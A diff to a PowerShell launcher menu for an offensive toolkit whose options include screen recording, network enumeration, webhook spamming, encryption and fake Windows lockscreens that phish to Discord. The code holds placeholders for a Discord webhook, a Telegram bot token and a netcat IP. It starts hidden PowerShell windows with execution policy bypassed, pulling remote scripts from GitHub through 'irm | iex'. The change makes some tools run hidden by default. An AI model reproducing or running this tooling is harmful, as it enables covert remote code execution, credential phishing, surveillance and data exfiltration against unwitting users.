@@ -14,7 +14,6 @@ $hookurl = "DISCORD_WEBHOOK_HERE"
 $ghurl = "PASTEBIN_URL_HERE"
 $tg = "TELEGRAM_BOT_TOKEN"
 $NCurl = "YOUR_NETCAT_IP_ADDRESS" # no port
-
 $Host.UI.RawUI.BackgroundColor = "Black"
 Clear-Host
 [Console]::SetWindowSize(80, 35)
@@ -47,10 +46,10 @@ $list = "=======================================================================
 = 6.  Decryptor                            19. Dummy Folder Creator          =
 =                                          20. Image To Console              =
 = GUI Tools                                21. Matrix Cascade                =
-= 7.  Search Folders for Filetypes                                           =
-= 8.  Record the Screen                    Phishing to Discord               =
+= 7.  Filetype Finder                                                        =
+= 8.  Screen Recorder                      Phishing to Discord               =
 = 9.  Network Enumeration                  22. Windows 10 Lockscreen         =
-= 10.  Mute Microphone                     23. Windows 11 Lockscreen         =
+= 10. Microphone Muter                     23. Windows 11 Lockscreen         =
 = 11. Webhook Spammer                                                        =
 = 12. Social Search                        Exit                              =
 = 13. GDI effects                          99. Close Program                 =
@@ -96,33 +95,43 @@ $Option = Read-Host "$list"
 
 
     while ($Option -ne '99'){
-    Header
+        Header
 
-        if (($Option -eq '5') -or ($Option -eq '6')){
-            Header
-            $danger = Read-Host "THIS IS A DANGEROUS SCRIPT - ARE YOU SURE? (Y/N)"
-        if ($danger -eq 'n'){
-            break
+            if (($Option -eq '5') -or ($Option -eq '6')){
+                Header
+                $danger = Read-Host "THIS IS A DANGEROUS SCRIPT - ARE YOU SURE? (Y/N)" =
+            if ($danger -eq 'n'){
+                break
+            }
+
         }
 
-    }
-
-    $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
-    $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
-        If ($hidden -eq 'y'){
+        $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
+        if (($Option -eq '14') -or ($Option -eq '15') -or ($Option -eq '16') -or ($Option -eq '22') -or ($Option -eq '23')){
+            $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
+            If ($hidden -eq 'y'){
+                Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
+                break
+            }
+            If ($hidden -eq 'n'){
+                Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
+                break
+            }
+            else{
+                Write-Host "No valid option selected"
+                break  
+            }
+        }
+        if (($Option -eq '7') -or ($Option -eq '8') -or ($Option -eq '9') -or ($Option -eq '10') -or ($Option -eq '11') -or ($Option -eq '12') -or ($Option -eq '13')){
             Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C irm $HideURL | iex ; `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
             break
         }
-        If ($hidden -eq 'n'){
+        else{
             Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$tg = `'$tg`' ;`$hookurl = `'$hookurl`' ; `$ghurl = `'$ghurl`' ; `$NCurl = `'$NCurl`' ; irm $url | iex")
             break
         }
-        else{
-            Write-Host "No valid option selected"
-            break  
-        }
     }
-
 
 sleep 1
 }
+
